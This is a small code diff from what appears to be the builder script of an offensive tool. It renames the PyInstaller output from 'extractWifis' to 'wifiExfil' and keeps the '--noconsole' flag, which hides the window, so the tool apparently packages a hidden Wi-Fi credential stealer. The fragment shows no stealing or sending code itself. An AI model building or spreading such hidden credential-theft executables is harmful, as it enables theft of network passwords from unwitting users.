@@ -25,7 +25,7 @@ def build():
         file.truncate()
         
 def compile():
-    cmd = ['cmd', '/c' ,'pyinstaller', 'script.py', '--onefile', '--noconsole', '--icon', 'icon.ico', '--name', 'extractWifis', '--log-level', 'ERROR']
+    cmd = ['cmd', '/c' ,'pyinstaller', 'script.py', '--onefile', '--noconsole', '--icon', 'icon.ico', '--name', 'wifiExfil', '--log-level', 'ERROR']
     subprocess.run(cmd,stdout=subprocess.DEVNULL)
     print("[+] Done!")
 
